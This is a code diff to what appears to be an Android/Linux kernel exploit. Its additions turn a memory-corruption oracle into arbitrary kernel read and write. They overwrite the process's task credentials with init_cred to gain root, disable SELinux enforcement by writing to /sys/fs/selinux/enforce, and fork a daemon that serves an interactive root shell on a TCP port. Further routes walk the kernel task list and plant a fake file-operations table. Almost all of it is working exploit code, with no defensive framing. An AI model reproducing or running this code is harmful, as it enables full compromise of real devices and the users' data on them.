@@ -1,5 +1,8 @@
 #include "common.h"
 
+#include <arpa/inet.h>
+#include <netinet/in.h>
+
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
 #endif
@@ -1159,6 +1162,185 @@ static int slide_restore_physical_oracle(void) {
   return gate_restored && probe_restored;
 }
 
+static int slide_kptr(uint64_t x) {
+  return ((x >> 40) == 0xffffffULL) && ((x & 7ULL) == 0);
+}
+
+static int slide_fire_read64(uintptr_t q, uint64_t *lo, uint64_t *hi) {
+  char addr[32];
+  snprintf(addr, sizeof(addr), "0x%zx", q);
+  SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+  SYSCHK(setenv("DIRECT_BOOTID_CHILD", "1", 1));
+  unsetenv("DIRECT_ERASE_WRITE");
+  unsetenv("DIRECT_WRITE_VALUE");
+  for (int n = 0; n < 3; n++) {
+    if (!select_slide_payload_index(0)) {
+      continue;
+    }
+    if (!slide_trigger_physical_state()) {
+      pr_info("hold-fire miss n=%d q=%016zx\n", n, q);
+      continue;
+    }
+    unsigned char raw[16];
+    if (!slide_bootid_read_uuid(raw)) {
+      pr_warning("hold-fire read fail n=%d\n", n);
+      continue;
+    }
+    memcpy(lo, raw, 8);
+    memcpy(hi, raw + 8, 8);
+    pr_info("hold-fire n=%d q=%016zx lo=%016llx hi=%016llx parent=%016zx\n",
+            n, q, (unsigned long long)*lo, (unsigned long long)*hi,
+            slide_oracle_parent);
+    if (*lo == (uint64_t)slide_oracle_parent) {
+      return 1;
+    }
+  }
+  return 0;
+}
+
+static int slide_fire_write64(uintptr_t dest, uintptr_t value) {
+  char addr[32];
+  char val[32];
+  snprintf(addr, sizeof(addr), "0x%zx", dest);
+  snprintf(val, sizeof(val), "0x%zx", value);
+  SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+  SYSCHK(setenv("DIRECT_ERASE_WRITE", "1", 1));
+  SYSCHK(setenv("DIRECT_WRITE_VALUE", val, 1));
+  unsetenv("DIRECT_BOOTID_CHILD");
+  for (int n = 0; n < 3; n++) {
+    if (!select_slide_payload_index(0)) {
+      continue;
+    }
+    if (slide_trigger_physical_state()) {
+      pr_info("hold-write n=%d dest=%016zx value=%016zx uid=%d euid=%d\n",
+              n, dest, value, (int)getuid(), (int)geteuid());
+      return 1;
+    }
+    pr_info("hold-write miss n=%d dest=%016zx\n", n, dest);
+  }
+  return 0;
+}
+
+#ifndef CRED_SELF_ROOT_PORT
+#define CRED_SELF_ROOT_PORT 5559
+#endif
+
+/* Detached root shell daemon: after the cred write lands, this process is
+ * uid 0; fork a setsid daemon serving an interactive root sh per TCP
+ * connection on 127.0.0.1:CRED_SELF_ROOT_PORT (adb forward to reach it). */
+static void cred_self_root_daemon(void) {
+  pid_t d = fork();
+  if (d != 0) {
+    return;
+  }
+  setsid();
+  int s = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (s < 0) {
+    _exit(1);
+  }
+  int one = 1;
+  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  struct sockaddr_in sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(CRED_SELF_ROOT_PORT);
+  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) != 0 || listen(s, 4) != 0) {
+    _exit(1);
+  }
+  for (;;) {
+    int c = accept(s, NULL, NULL);
+    if (c < 0) {
+      continue;
+    }
+    pid_t h = fork();
+    if (h == 0) {
+      dup2(c, 0);
+      dup2(c, 1);
+      dup2(c, 2);
+      if (c > 2) {
+        close(c);
+      }
+      execl("/system/bin/sh", "sh", "-i", (char *)NULL);
+      _exit(1);
+    }
+    close(c);
+  }
+}
+
+/* DIRECT_CRED_SELF: reclaim-free root built only on the two proven
+ * primitives (boot_id/uuid arb-read + one-child rb_erase arb-write).
+ * perf_find_task_self() leaks THIS attempt process's task_struct (no task
+ * list walk, no hold-mm, no fops reclaim).  Fire 1 validates the pointer
+ * via the pid qword at task+0x630 (smash slot +0x628 restart_block tail).
+ * Fire 2 plants init_cred into task->cred: [B]=V, collateral [V+0]=B-8
+ * smashes init_cred.usage/uid but leaves caps intact, so a follow-up
+ * setresuid(0,0,0) via CAP_SETUID mints a fresh clean root cred (and fixes
+ * real_cred too).  rb_erase semantics confirmed on vmlinux.elf disasm. */
+static int app_cred_self_route(void) {
+  pid_t pid = getpid();
+  uintptr_t self_task = perf_find_task_self();
+  if (!self_task) {
+    return 0;
+  }
+  if ((self_task >> 40) != 0xffffffULL || (self_task & 7)) {
+    pr_warning("cred-self implausible task=%016zx\n", self_task);
+    return 0;
+  }
+
+  if (!getenv("DIRECT_CRED_SELF_NOVALIDATE")) {
+    uint64_t lo = 0, hi = 0;
+    int ok = slide_fire_read64(self_task + TASK_PID_OFF - 8, &lo, &hi);
+    int valid = ok && (uint32_t)hi == (uint32_t)pid &&
+                (uint32_t)(hi >> 32) == (uint32_t)pid;
+    pr_info("cred-self validate task=%016zx pid=%d lo=%016llx hi=%016llx "
+            "ok=%d valid=%d\n",
+            self_task, (int)pid, (unsigned long long)lo,
+            (unsigned long long)hi, ok, valid);
+    if (!valid) {
+      return 0;
+    }
+  }
+
+  uintptr_t init_cred = text_addr(INIT_CRED);
+  if (!slide_fire_write64(self_task + TASK_CRED_OFF, init_cred)) {
+    return 0;
+  }
+
+  setresgid(0, 0, 0);
+  setresuid(0, 0, 0);
+  uid_t uid = getuid();
+  pr_info("cred-self post-setresuid uid=%d euid=%d gid=%d egid=%d\n",
+          (int)uid, (int)geteuid(), (int)getgid(), (int)getegid());
+  if (uid != 0) {
+    pr_warning("cred-self setresuid failed errno=%d\n", errno);
+    return 0;
+  }
+
+  pr_success("cred-self ROOT pid=%d task=%016zx uid=%d\n",
+             (int)pid, self_task, (int)uid);
+
+  int pfd = open("/data/local/tmp/cred-self-root.txt",
+                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+  if (pfd >= 0) {
+    dprintf(pfd, "uid=%d euid=%d pid=%d task=%016zx slide=%016llx\n",
+            (int)uid, (int)geteuid(), (int)pid, self_task,
+            (unsigned long long)kaslr_slide);
+    close(pfd);
+  }
+
+  /* Best-effort permissive: cred->security is now the kernel SID. */
+  int efd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+  if (efd >= 0) {
+    ssize_t w = write(efd, "0", 1);
+    pr_info("cred-self setenforce write=%zd errno=%d\n", w, errno);
+    close(efd);
+  }
+
+  cred_self_root_daemon();
+  return 1;
+}
+
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static int app_trigger_fops_slide_slot(size_t slot) {
   static size_t delay_index;
@@ -1221,18 +1403,257 @@ int app_trigger_fops_slide_route(void) {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
   };
+  if (getenv("DIRECT_CRED_SELF")) {
+    return app_cred_self_route();
+  }
   if (!select_slide_payload_index(0)) {
     return 0;
   }
+  if (getenv("DIRECT_FOPS_PLANT")) {
+    char val[32];
+    char addr[32];
+    if (!fake_fops) {
+      fake_fops = slide_oracle_page_base + FOPS_TABLE_OFF;
+    }
+    snprintf(val, sizeof(val), "0x%zx", fake_fops);
+    snprintf(addr, sizeof(addr), "0x%zx",
+             (uintptr_t)ASHMEM_MISC_FOPS);
+    SYSCHK(setenv("DIRECT_ERASE_WRITE", "1", 1));
+    SYSCHK(setenv("DIRECT_WRITE_VALUE", val, 1));
+    SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+    unsetenv("DIRECT_BOOTID_CHILD");
+    if (!select_slide_payload_index(0)) {
+      return 0;
+    }
+    pr_info("fops-plant dest=%s value=%s lock=%016zx\n",
+            addr, val, fake_lock);
+  }
   int delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
   delay_index++;
+  /* SLIDE_ENTER_DELAY_PIN=1: keep the caller-provided SLIDE_ENTER_DELAY_USEC
+   * instead of cycling the built-in array.  With a fixed 60 ms delay plus
+   * tight burst spacing, all burst shots land inside the pselect window
+   * even when load overshoots usleep (cold-boot calls=1 regression). */
+  if (getenv("SLIDE_ENTER_DELAY_PIN") && getenv("SLIDE_ENTER_DELAY_USEC")) {
+    delay = (int)slide_enter_delay_usec();
+  }
   char delay_arg[16];
   snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
   SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
-  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
-          "delay=%d\n",
-          slide_oracle_parent, slide_oracle_target, fake_lock, delay);
-  return slide_trigger_physical_state();
+  pr_info("app slide route parent=%016zx target=%016zx child=%016zx "
+          "task=%016zx lock=%016zx delay=%d\n",
+          slide_oracle_parent, slide_oracle_target, slide_oracle_child,
+          fake_task, fake_lock, delay);
+  int ok = slide_trigger_physical_state();
+  if (ok) {
+    if (getenv("DIRECT_FOPS_PLANT")) {
+      int cfi = try_cfi_stage();
+      pr_info("fops-plant cfi=%d step=%d uid=%d\n",
+              cfi, cfi_last_step, (int)getuid());
+    }
+  }
+  if (getenv("DIRECT_HOLD_MM")) {
+    if (slide_hold_mm) {
+      uint64_t hlo = 0;
+      uint64_t hhi = 0;
+      int got = 0;
+      if (ok) {
+        unsigned char raw0[16];
+        if (slide_bootid_read_uuid(raw0)) {
+          memcpy(&hlo, raw0, 8);
+          memcpy(&hhi, raw0 + 8, 8);
+          pr_info("hold-first oracle lo=%016llx hi=%016llx parent=%016zx\n",
+                  (unsigned long long)hlo, (unsigned long long)hhi,
+                  slide_oracle_parent);
+          if (hlo == (uint64_t)slide_oracle_parent) {
+            if (slide_kptr(hhi)) {
+              got = 1;
+            }
+          }
+        }
+      } else {
+        pr_info("hold-first fire miss, no retry\n");
+      }
+      pr_info("hold-owner got=%d lo=%016llx hi=%016llx mm=%016zx\n",
+              got, (unsigned long long)hlo, (unsigned long long)hhi,
+              slide_hold_mm);
+      if (got) {
+        if (slide_kptr(hhi)) {
+          uintptr_t child_task = (uintptr_t)hhi;
+          uintptr_t init_cred = text_addr(INIT_CRED);
+          pr_info("hold-child-cred task=%016zx init_cred=%016zx pid=%d\n",
+                  child_task, init_cred, (int)slide_hold_child);
+          slide_fire_write64(child_task + TASK_CRED_OFF, init_cred);
+          slide_fire_write64(child_task + TASK_REAL_CRED_OFF, init_cred);
+          usleep(200000);
+          pr_info("hold-cred done self_uid=%d hold_pid=%d\n",
+                  (int)getuid(), (int)slide_hold_child);
+        }
+      }
+    }
+  }
+  if (getenv("DIRECT_TASK_NEWEST")) {
+    if (ok) {
+      unsigned char rawn[16];
+      if (slide_bootid_read_uuid(rawn)) {
+        uint64_t nlo = 0;
+        uint64_t nhi = 0;
+        memcpy(&nlo, rawn, 8);
+        memcpy(&nhi, rawn + 8, 8);
+        pr_info("newest-first lo=%016llx hi=%016llx parent=%016zx\n",
+                (unsigned long long)nlo, (unsigned long long)nhi,
+                slide_oracle_parent);
+        if (nlo == (uint64_t)slide_oracle_parent) {
+          if (slide_kptr(nhi)) {
+            uintptr_t newest = (uintptr_t)nhi - TASK_TASKS_OFF;
+            uintptr_t init_cred = text_addr(INIT_CRED);
+            pr_info("newest-task %016zx init_cred=%016zx\n",
+                    newest, init_cred);
+            slide_fire_write64(newest + TASK_CRED_OFF, init_cred);
+            slide_fire_write64(newest + TASK_REAL_CRED_OFF, init_cred);
+            pr_info("newest-cred uid=%d euid=%d\n",
+                    (int)getuid(), (int)geteuid());
+          }
+        }
+      }
+    }
+  }
+  if (ok && getenv("DIRECT_BOOTID_RECLAIM")) {
+    unsigned char raw[16];
+    int read_ok = slide_bootid_read_uuid(raw);
+    uint64_t lo = 0, hi = 0;
+    if (read_ok) {
+      memcpy(&lo, raw, 8);
+      memcpy(&hi, raw + 8, 8);
+    }
+    pr_info("direct-bootid oracle read_ok=%d lo=%016llx hi=%016llx "
+            "parent=%016zx target=%016zx child=%016zx task=%016zx "
+            "lock=%016zx\n",
+            read_ok, (unsigned long long)lo, (unsigned long long)hi,
+            slide_oracle_parent, slide_oracle_target, slide_oracle_child,
+            fake_task, fake_lock);
+    if (read_ok && getenv("DIRECT_CRED_CHAIN") &&
+        (hi >> 32) == 0xffffffffffffff88ULL >> 32) {
+      /* hi looks like a physmap/kimage pointer — treat as mm->owner. */
+    }
+    if (read_ok && getenv("DIRECT_TASK_WALK")) {
+      uintptr_t cursor = text_addr(INIT_TASK);
+      int our_pid = getpid();
+      for (int step = 0; step < 64; step++) {
+        /* step 0: smash restart_block tail, read init pid (0).
+         * later: smash restart_block, read that task's pid. */
+        uintptr_t q = cursor + TASK_PID_OFF - 8;
+        char addr[32];
+        snprintf(addr, sizeof(addr), "0x%zx", q);
+        SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+        SYSCHK(setenv("DIRECT_BOOTID_CHILD", "1", 1));
+        unsetenv("DIRECT_ERASE_WRITE");
+        if (!select_slide_payload_index(0)) {
+          pr_warning("task-walk select failed step=%d\n", step);
+          break;
+        }
+        if (!slide_trigger_physical_state()) {
+          pr_info("task-walk fire miss step=%d cursor=%016zx\n",
+                  step, cursor);
+          continue;
+        }
+        unsigned char wr[16];
+        if (!slide_bootid_read_uuid(wr)) {
+          pr_warning("task-walk read fail step=%d\n", step);
+          break;
+        }
+        uint64_t wlo = 0, whi = 0;
+        memcpy(&wlo, wr, 8);
+        memcpy(&whi, wr + 8, 8);
+        pr_info("task-walk step=%d lo=%016llx hi=%016llx cursor=%016zx\n",
+                step, (unsigned long long)wlo, (unsigned long long)whi,
+                cursor);
+        if (wlo != (uint64_t)slide_oracle_parent) {
+          pr_info("task-walk erase miss step=%d\n", step);
+          continue;
+        }
+        uint32_t pid = (uint32_t)whi;
+        pr_info("task-walk pid=%u want=%d task=%016zx\n",
+                pid, our_pid, cursor);
+        if (pid == (uint32_t)our_pid) {
+          char caddr[32];
+          snprintf(caddr, sizeof(caddr), "0x%zx", cursor + TASK_CRED_OFF);
+          SYSCHK(setenv("DIRECT_ERASE_WRITE", "1", 1));
+          SYSCHK(setenv("DIRECT_CRED_PRELOAD", "1", 1));
+          SYSCHK(setenv("DIRECT_BOOTID_ADDR", caddr, 1));
+          unsetenv("DIRECT_BOOTID_CHILD");
+          if (select_slide_payload_index(0) &&
+              slide_trigger_physical_state()) {
+            pr_info("task-walk cred write uid=%d euid=%d\n",
+                    (int)getuid(), (int)geteuid());
+          }
+          snprintf(caddr, sizeof(caddr), "0x%zx",
+                   cursor + TASK_REAL_CRED_OFF);
+          SYSCHK(setenv("DIRECT_BOOTID_ADDR", caddr, 1));
+          if (select_slide_payload_index(0) &&
+              slide_trigger_physical_state()) {
+            pr_info("task-walk real_cred write uid=%d euid=%d\n",
+                    (int)getuid(), (int)geteuid());
+          }
+          break;
+        }
+        if (!getenv("DIRECT_TASK_WALK_LINKS")) {
+          break;
+        }
+        /* next tasks.next */
+        snprintf(addr, sizeof(addr), "0x%zx", cursor + TASK_TASKS_OFF - 8);
+        SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+        SYSCHK(setenv("DIRECT_BOOTID_CHILD", "1", 1));
+        unsetenv("DIRECT_ERASE_WRITE");
+        if (!select_slide_payload_index(0)) {
+          pr_info("task-walk next-link select miss task=%016zx\n", cursor);
+          continue;
+        }
+        if (!slide_trigger_physical_state()) {
+          pr_info("task-walk next-link miss task=%016zx\n", cursor);
+          continue;
+        }
+        if (!slide_bootid_read_uuid(wr)) {
+          break;
+        }
+        memcpy(&wlo, wr, 8);
+        memcpy(&whi, wr + 8, 8);
+        if (wlo != (uint64_t)slide_oracle_parent) {
+          continue;
+        }
+        cursor = (uintptr_t)whi - TASK_TASKS_OFF;
+      }
+    }
+    if (read_ok && getenv("DIRECT_CRED_CHAIN") &&
+        ((hi >> 40) == 0xffffffULL)) {
+      uintptr_t task = (uintptr_t)hi;
+      uintptr_t cred_slot = task + TASK_CRED_OFF;
+      char addr[32];
+      snprintf(addr, sizeof(addr), "0x%zx", cred_slot);
+      pr_info("cred-chain task=%016zx cred_slot=%016zx\n", task, cred_slot);
+      SYSCHK(setenv("DIRECT_ERASE_WRITE", "1", 1));
+      SYSCHK(setenv("DIRECT_CRED_PRELOAD", "1", 1));
+      SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+      unsetenv("DIRECT_BOOTID_CHILD");
+      if (!select_slide_payload_index(0)) {
+        pr_warning("cred-chain select failed\n");
+      } else {
+        pr_info("cred-chain erase parent=%016zx value=%016zx\n",
+                slide_oracle_parent, slide_oracle_target);
+        int wok = slide_trigger_physical_state();
+        pr_info("cred-chain write ok=%d uid=%d\n", wok, (int)getuid());
+        cred_slot = task + TASK_REAL_CRED_OFF;
+        snprintf(addr, sizeof(addr), "0x%zx", cred_slot);
+        SYSCHK(setenv("DIRECT_BOOTID_ADDR", addr, 1));
+        if (select_slide_payload_index(0)) {
+          wok = slide_trigger_physical_state();
+          pr_info("real_cred-chain write ok=%d uid=%d euid=%d\n",
+                  wok, (int)getuid(), (int)geteuid());
+        }
+      }
+    }
+  }
+  return ok;
 }
 #endif
 
@@ -1803,6 +2224,7 @@ int slide_leak_kernel_base(void) {
 }
 
 #define SLIDE_BOOTID_PATH "/proc/sys/kernel/random/boot_id"
+#define SLIDE_UUID_PATH "/proc/sys/kernel/random/uuid"
 
 /* Read the current boot_id sysctl value as a raw 16-byte UUID.
  * /proc/sys/kernel/random/boot_id formats &sysctl_bootid with %pU, so after
@@ -1810,7 +2232,9 @@ int slide_leak_kernel_base(void) {
  * kernel address Q, this returns the 16 bytes at Q.  Returns 1 on success. */
 int slide_bootid_read_uuid(unsigned char out[16]) {
   char buf[64];
-  int fd = open(SLIDE_BOOTID_PATH, O_RDONLY | O_CLOEXEC);
+  const char *path = getenv("DIRECT_BOOTID_BOOTID") ? SLIDE_BOOTID_PATH
+                                                    : SLIDE_UUID_PATH;
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
   if (fd < 0) {
     return 0;
   }
@@ -1856,8 +2280,11 @@ int slide_bootid_read64(uint64_t *out) {
   if (!slide_bootid_read_uuid(uuid)) {
     return 0;
   }
-  uint64_t value = 0;
-  memcpy(&value, uuid, sizeof(value));
-  *out = value;
+  uint64_t lo = 0, hi = 0;
+  memcpy(&lo, uuid, 8);
+  memcpy(&hi, uuid + 8, 8);
+  pr_info("direct-oracle raw lo=%016llx hi=%016llx\n",
+          (unsigned long long)lo, (unsigned long long)hi);
+  *out = lo;
   return 1;
 }
